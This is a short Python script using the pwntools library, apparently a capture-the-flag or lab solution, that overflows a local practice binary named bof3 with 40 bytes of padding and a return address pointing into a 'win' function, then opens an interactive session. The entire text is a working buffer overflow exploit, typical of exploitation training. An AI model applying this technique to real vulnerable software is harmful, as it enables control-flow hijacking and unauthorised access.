from pwn import *

r = process("./bof3")

win = 0x401249
payload = b'a'*40 + p64(win+5)
r.sendline(payload)
r.interactive()